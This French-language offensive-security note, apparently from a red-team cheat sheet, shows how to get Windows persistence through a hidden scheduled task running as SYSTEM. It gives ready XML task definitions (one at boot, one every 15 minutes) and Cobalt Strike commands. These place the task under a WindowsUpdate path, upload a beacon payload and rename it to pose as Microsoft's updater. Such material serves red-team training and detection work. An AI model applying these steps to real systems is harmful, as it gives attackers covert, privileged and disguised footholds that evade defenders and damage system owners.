
Créer une simple tâche planifiée en tant que SYSTEM.


Au démarrage de l'ordinateur

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
		</Exec>
	</Actions>
</Task>
```

Toutes les 15 minutes

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2025-09-25T01:03:00</StartBoundary> 
      <Repetition>
		<Interval>PT15M</Interval>
		<Duration>P1D</Duration>
		<StopAtDurationEnd>false</StopAtDurationEnd>
	</Repetition>
    </TimeTrigger>
  </Triggers>
  	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
		</Exec>
	</Actions>
</Task>
```


## Cobalt Strike

1. Créer un fichier XML qui définit notre tache planifiée qui éxecute C:\Program Files\Microsoft Update Health Tools\updater.exe.

2. Créer la tache planifiée

```
schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
```

3. Sélectionner notre fichier XML.

4. Upload notre exécutable dans C:\Program Files\Microsoft Update Health Tools\

```
cd C:\Program Files\Microsoft Update Health Tools\
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe updater.exe
```

Supprimer la tache planifiée

```
schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
```